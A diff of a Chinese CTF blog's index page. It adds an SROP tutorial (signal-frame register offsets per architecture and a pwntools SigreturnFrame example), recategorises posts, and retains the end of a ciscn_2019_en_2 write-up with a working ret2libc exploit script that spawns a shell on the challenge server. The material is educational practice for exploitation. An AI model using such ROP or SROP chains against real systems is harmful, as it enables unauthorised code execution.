@@ -158,6 +158,85 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/22/srop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yang">
+      <meta itemprop="description" content="it is funny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/22/srop/" class="post-title-link" itemprop="url">srop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-22 19:02:51 / 修改时间：19:11:54" itemprop="dateCreated datePublished" datetime="2021-12-22T19:02:51+08:00">2021-12-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/practice/" itemprop="url" rel="index"><span itemprop="name">practice</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/practice/srop/" itemprop="url" rel="index"><span itemprop="name">srop</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### signal机制</span><br><span class="line"></span><br><span class="line">1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</span><br><span class="line">2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址**。我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**</span><br><span class="line">3. signal执行完成之后，就会执行sigreturn（执行sigreturn时，sp执行Signal Frame的头部），为进程恢复上下文。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</span><br><span class="line"></span><br><span class="line">所以只要在栈帧中布置好伪造的Signal Frame，然后调用sigreturn即可控制各个寄存器以控制执行流。</span><br><span class="line"></span><br><span class="line">### 各个架构的Signal Frame</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">registers = &#123;</span><br><span class="line"># Reference : http://lxr.free-electrons.com/source/arch/x86/include/asm/sigcontext.h?v=2.6.28#L138</span><br><span class="line">        &#x27;i386&#x27; : &#123;0: &#x27;gs&#x27;, 4: &#x27;fs&#x27;, 8: &#x27;es&#x27;, 12: &#x27;ds&#x27;, 16: &#x27;edi&#x27;, 20: &#x27;esi&#x27;, 24: &#x27;ebp&#x27;, 28: &#x27;esp&#x27;,</span><br><span class="line">                  32: &#x27;ebx&#x27;, 36: &#x27;edx&#x27;, 40: &#x27;ecx&#x27;, 44: &#x27;eax&#x27;, 48: &#x27;trapno&#x27;, 52: &#x27;err&#x27;, 56: &#x27;eip&#x27;,</span><br><span class="line">                  60: &#x27;cs&#x27;, 64: &#x27;eflags&#x27;, 68: &#x27;esp_at_signal&#x27;, 72: &#x27;ss&#x27;, 76: &#x27;fpstate&#x27;&#125;,</span><br><span class="line"># Reference : https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf</span><br><span class="line">        &#x27;amd64&#x27;: &#123;0: &#x27;uc_flags&#x27;, 8: &#x27;&amp;uc&#x27;, 16: &#x27;uc_stack.ss_sp&#x27;, 24: &#x27;uc_stack.ss_flags&#x27;,</span><br><span class="line">                  32: &#x27;uc_stack.ss_size&#x27;, 40: &#x27;r8&#x27;, 48: &#x27;r9&#x27;, 56: &#x27;r10&#x27;, 64: &#x27;r11&#x27;, 72: &#x27;r12&#x27;,</span><br><span class="line">                  80: &#x27;r13&#x27;, 88: &#x27;r14&#x27;, 96: &#x27;r15&#x27;, 104: &#x27;rdi&#x27;, 112: &#x27;rsi&#x27;, 120: &#x27;rbp&#x27;, 128: &#x27;rbx&#x27;,</span><br><span class="line">                  136: &#x27;rdx&#x27;, 144: &#x27;rax&#x27;, 152: &#x27;rcx&#x27;, 160: &#x27;rsp&#x27;, 168: &#x27;rip&#x27;, 176: &#x27;eflags&#x27;,</span><br><span class="line">                  184: &#x27;csgsfs&#x27;, 192: &#x27;err&#x27;, 200: &#x27;trapno&#x27;, 208: &#x27;oldmask&#x27;, 216: &#x27;cr2&#x27;,</span><br><span class="line">                  224: &#x27;&amp;fpstate&#x27;, 232: &#x27;__reserved&#x27;, 240: &#x27;sigmask&#x27;&#125;,</span><br><span class="line"># Reference : http://lxr.free-electrons.com/source/arch/arm/include/uapi/asm/sigcontext.h#L15</span><br><span class="line">        &#x27;arm&#x27; : &#123;0: &#x27;uc_flags&#x27;, 4: &#x27;uc_link&#x27;, 8: &#x27;uc_stack.ss_sp&#x27;, 12: &#x27;uc_stack.ss_flags&#x27;,</span><br><span class="line">                 16: &#x27;uc_stack.ss_size&#x27;, 20: &#x27;trap_no&#x27;, 24: &#x27;error_code&#x27;, 28: &#x27;oldmask&#x27;, 32: &#x27;r0&#x27;,</span><br><span class="line">                 36: &#x27;r1&#x27;, 40: &#x27;r2&#x27;, 44: &#x27;r3&#x27;, 48: &#x27;r4&#x27;, 52: &#x27;r5&#x27;, 56: &#x27;r6&#x27;, 60: &#x27;r7&#x27;, 64: &#x27;r8&#x27;,</span><br><span class="line">                 68: &#x27;r9&#x27;, 72: &#x27;r10&#x27;, 76: &#x27;fp&#x27;, 80: &#x27;ip&#x27;, 84: &#x27;sp&#x27;, 88: &#x27;lr&#x27;, 92: &#x27;pc&#x27;, 96: &#x27;cpsr&#x27;,</span><br><span class="line">                 100: &#x27;fault_address&#x27;, 104: &#x27;uc_sigmask&#x27;, 108: &#x27;__unused&#x27;, 112: &#x27;uc_regspace&#x27;,</span><br><span class="line">                 232: &#x27;VFPU-magic&#x27;, 236: &#x27;VFPU-size&#x27;&#125;,</span><br><span class="line"># Reference : http://lxr.free-electrons.com/source/arch/mips/include/uapi/asm/sigcontext.h#L15</span><br><span class="line">        &#x27;mips&#x27;: &#123;0: &#x27;sf_ass0&#x27;, 4: &#x27;sf_ass1&#x27;, 8: &#x27;sf_ass2&#x27;, 12: &#x27;sf_ass3&#x27;, 16: &#x27;sf_ass4&#x27;, 20: &#x27;sf_pad0&#x27;,</span><br><span class="line">                 24: &#x27;sf_pad1&#x27;, 28: &#x27;sc_regmask&#x27;, 32: &#x27;sc_status&#x27;, 36: &#x27;pc&#x27;, 44: &#x27;padding&#x27;, 52: &#x27;at&#x27;, 60: &#x27;v0&#x27;,</span><br><span class="line">                 68: &#x27;v1&#x27;, 76: &#x27;a0&#x27;, 84: &#x27;a1&#x27;, 92: &#x27;a2&#x27;, 100: &#x27;a3&#x27;, 108: &#x27;t0&#x27;, 116: &#x27;t1&#x27;, 124: &#x27;t2&#x27;,</span><br><span class="line">                 132: &#x27;t3&#x27;, 140: &#x27;t4&#x27;, 148: &#x27;t5&#x27;, 156: &#x27;t6&#x27;, 164: &#x27;t7&#x27;, 172: &#x27;s0&#x27;, 180: &#x27;s1&#x27;, 188: &#x27;s2&#x27;,</span><br><span class="line">                 196: &#x27;s3&#x27;, 204: &#x27;s4&#x27;, 212: &#x27;s5&#x27;, 220: &#x27;s6&#x27;, 228: &#x27;s7&#x27;, 236: &#x27;t8&#x27;, 244: &#x27;t9&#x27;, 252: &#x27;k0&#x27;,</span><br><span class="line">                 260: &#x27;k1&#x27;, 268: &#x27;gp&#x27;, 276: &#x27;sp&#x27;, 284: &#x27;s8&#x27;, 292: &#x27;ra&#x27;&#125;,</span><br><span class="line">        &#x27;mipsel&#x27;: &#123;0: &#x27;sf_ass0&#x27;, 4: &#x27;sf_ass1&#x27;, 8: &#x27;sf_ass2&#x27;, 12: &#x27;sf_ass3&#x27;, 16: &#x27;sf_ass4&#x27;, 20: &#x27;sc_regmask&#x27;,</span><br><span class="line">                   24: &#x27;sc_status&#x27;, 32: &#x27;pc&#x27;, 40: &#x27;padding&#x27;, 48: &#x27;at&#x27;, 56: &#x27;v0&#x27;, 64: &#x27;v1&#x27;, 72: &#x27;a0&#x27;,</span><br><span class="line">                   80: &#x27;a1&#x27;, 88: &#x27;a2&#x27;, 96: &#x27;a3&#x27;, 104: &#x27;t0&#x27;, 112: &#x27;t1&#x27;, 120: &#x27;t2&#x27;, 128: &#x27;t3&#x27;, 136: &#x27;t4&#x27;,</span><br><span class="line">                   144: &#x27;t5&#x27;, 152: &#x27;t6&#x27;, 160: &#x27;t7&#x27;, 168: &#x27;s0&#x27;, 176: &#x27;s1&#x27;, 184: &#x27;s2&#x27;, 192: &#x27;s3&#x27;, 200: &#x27;s4&#x27;,</span><br><span class="line">                   208: &#x27;s5&#x27;, 216: &#x27;s6&#x27;, 224: &#x27;s7&#x27;, 232: &#x27;t8&#x27;, 240: &#x27;t9&#x27;, 248: &#x27;k0&#x27;, 256: &#x27;k1&#x27;, 264: &#x27;gp&#x27;,</span><br><span class="line">                   272: &#x27;sp&#x27;, 280: &#x27;s8&#x27;, 288: &#x27;ra&#x27;&#125;,</span><br><span class="line">        &#x27;aarch64&#x27;: &#123;312: &#x27;x0&#x27;, 320: &#x27;x1&#x27;, 328: &#x27;x2&#x27;, 336: &#x27;x3&#x27;,</span><br><span class="line">                    344: &#x27;x4&#x27;,  352: &#x27;x5&#x27;, 360: &#x27;x6&#x27;, 368: &#x27;x7&#x27;,</span><br><span class="line">                    376: &#x27;x8&#x27;, 384: &#x27;x9&#x27;, 392: &#x27;x10&#x27;, 400: &#x27;x11&#x27;,</span><br><span class="line">                    408: &#x27;x12&#x27;, 416: &#x27;x13&#x27;, 424: &#x27;x14&#x27;, 432: &#x27;x15&#x27;,</span><br><span class="line">                    440: &#x27;x16&#x27;, 448: &#x27;x17&#x27;, 456: &#x27;x18&#x27;, 464: &#x27;x19&#x27;,</span><br><span class="line">                    472: &#x27;x20&#x27;, 480: &#x27;x21&#x27;, 488: &#x27;x22&#x27;, 496: &#x27;x23&#x27;,</span><br><span class="line">                    504: &#x27;x24&#x27;, 512: &#x27;x25&#x27;, 520: &#x27;x26&#x27;, 528: &#x27;x27&#x27;,</span><br><span class="line">                    536: &#x27;x28&#x27;, 544: &#x27;x29&#x27;, 552: &#x27;x30&#x27;, 560: &#x27;sp&#x27;,</span><br><span class="line">                    568: &#x27;pc&#x27;, 592: &#x27;magic&#x27;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="利用工具进行srop攻击"><a href="#利用工具进行srop攻击" class="headerlink" title="利用工具进行srop攻击"></a>利用工具进行srop攻击</h1><p>pwntools已经集成srop工具，使用示例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">sig=SigreturnFrame()</span><br><span class="line">sig.rax=constants.SYS_read</span><br><span class="line">sig.rdi=<span class="number">0</span></span><br><span class="line">sig.rsi=stackleak</span><br><span class="line">sig.rdx=<span class="number">0x400</span></span><br><span class="line">sig.rip=syscall</span><br><span class="line">sig.rsp=stackleak</span><br><span class="line">sig.r8=<span class="number">0x900</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/moderncpp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -189,7 +268,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-07 01:34:10" itemprop="dateModified" datetime="2021-11-07T01:34:10+08:00">2021-11-07</time>
+                <time title="修改时间：2021-12-22 19:09:28" itemprop="dateModified" datetime="2021-12-22T19:09:28+08:00">2021-12-22</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -197,11 +276,11 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bytectf/" itemprop="url" rel="index"><span itemprop="name">bytectf</span></a>
+                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bytectf/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                  <a href="/categories/reverse/bytectf/" itemprop="url" rel="index"><span itemprop="name">bytectf</span></a>
                 </span>
             </span>
 
@@ -328,25 +407,31 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-09-17 15:40:16 / 修改时间：15:42:02" itemprop="dateCreated datePublished" datetime="2021-09-17T15:40:16+08:00">2021-09-17</time>
+              <time title="创建时间：2021-09-17 15:40:16" itemprop="dateCreated datePublished" datetime="2021-09-17T15:40:16+08:00">2021-09-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-22 19:09:13" itemprop="dateModified" datetime="2021-12-22T19:09:13+08:00">2021-12-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%8D%B7%E5%8D%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">卷卷题</span></a>
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%8D%B7%E5%8D%B7%E9%A2%98/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                  <a href="/categories/pwn/%E5%8D%B7%E5%8D%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">卷卷题</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%8D%B7%E5%8D%B7%E9%A2%98/pwn/largebin/" itemprop="url" rel="index"><span itemprop="name">largebin</span></a>
+                  <a href="/categories/pwn/%E5%8D%B7%E5%8D%B7%E9%A2%98/largebin/" itemprop="url" rel="index"><span itemprop="name">largebin</span></a>
                 </span>
             </span>
 
@@ -522,29 +607,35 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-07-08 21:52:15 / 修改时间：21:55:33" itemprop="dateCreated datePublished" datetime="2021-07-08T21:52:15+08:00">2021-07-08</time>
+              <time title="创建时间：2021-07-08 21:52:15" itemprop="dateCreated datePublished" datetime="2021-07-08T21:52:15+08:00">2021-07-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-22 19:08:36" itemprop="dateModified" datetime="2021-12-22T19:08:36+08:00">2021-12-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                  <a href="/categories/pwn/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/pwn/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
+                  <a href="/categories/pwn/buu/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/pwn/heap/fastbin/" itemprop="url" rel="index"><span itemprop="name">fastbin</span></a>
+                  <a href="/categories/pwn/buu/heap/fastbin/" itemprop="url" rel="index"><span itemprop="name">fastbin</span></a>
                 </span>
             </span>
 
@@ -728,21 +819,27 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-06-29 19:25:28 / 修改时间：19:29:30" itemprop="dateCreated datePublished" datetime="2021-06-29T19:25:28+08:00">2021-06-29</time>
+              <time title="创建时间：2021-06-29 19:25:28" itemprop="dateCreated datePublished" datetime="2021-06-29T19:25:28+08:00">2021-06-29</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-22 19:07:38" itemprop="dateModified" datetime="2021-12-22T19:07:38+08:00">2021-12-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%8D%B7%E5%8D%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">卷卷题</span></a>
+                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%8D%B7%E5%8D%B7%E9%A2%98/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                  <a href="/categories/reverse/%E5%8D%B7%E5%8D%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">卷卷题</span></a>
                 </span>
             </span>
 
@@ -926,21 +1023,27 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-06-19 22:22:32 / 修改时间：22:24:11" itemprop="dateCreated datePublished" datetime="2021-06-19T22:22:32+08:00">2021-06-19</time>
+              <time title="创建时间：2021-06-19 22:22:32" itemprop="dateCreated datePublished" datetime="2021-06-19T22:22:32+08:00">2021-06-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-22 19:08:11" itemprop="dateModified" datetime="2021-12-22T19:08:11+08:00">2021-12-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                  <a href="/categories/pwn/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                 </span>
             </span>
 
@@ -998,21 +1101,27 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-06-18 17:59:40 / 修改时间：18:08:56" itemprop="dateCreated datePublished" datetime="2021-06-18T17:59:40+08:00">2021-06-18</time>
+              <time title="创建时间：2021-06-18 17:59:40" itemprop="dateCreated datePublished" datetime="2021-06-18T17:59:40+08:00">2021-06-18</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-22 19:08:58" itemprop="dateModified" datetime="2021-12-22T19:08:58+08:00">2021-12-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                  <a href="/categories/pwn/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                 </span>
             </span>
 
@@ -1090,21 +1199,27 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-06-17 16:54:51 / 修改时间：17:22:45" itemprop="dateCreated datePublished" datetime="2021-06-17T16:54:51+08:00">2021-06-17</time>
+              <time title="创建时间：2021-06-17 16:54:51" itemprop="dateCreated datePublished" datetime="2021-06-17T16:54:51+08:00">2021-06-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-22 19:08:23" itemprop="dateModified" datetime="2021-12-22T19:08:23+08:00">2021-12-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                  <a href="/categories/pwn/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                 </span>
             </span>
 
@@ -1146,104 +1261,6 @@
 <p>原因是，第一次控制返回地址的时候执行了pop rdi，导致栈地址向下向上偏移了8位，而Ubuntu18要求栈地址要16位(0x10)对齐，所以在第二次控制返回地址的时候加个p64(ret)就可以解决</p>
 <p><img src="/2021/06/17/buu-ciscn-2019-en-2/ret.png"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># sh=process(&quot;./ciscn_2019_en_2&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25466</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_en_2&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got=elf.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">poprdi=<span class="number">0x400c83</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(poprdi)+p64(gets_got)+p64(puts)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">gets=u64(sh.recvuntil(<span class="string">&quot;\n&quot;</span>,<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=gets-libc.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;b&quot;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(ret)+p64(poprdi)+p64(binsh)+p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/16/buu-jarvisoj-level2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yang">
-      <meta itemprop="description" content="it is funny">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/16/buu-jarvisoj-level2/" class="post-title-link" itemprop="url">buu-jarvisoj_level2</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-06-16 22:52:15 / 修改时间：23:13:42" itemprop="dateCreated datePublished" datetime="2021-06-16T22:52:15+08:00">2021-06-16</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
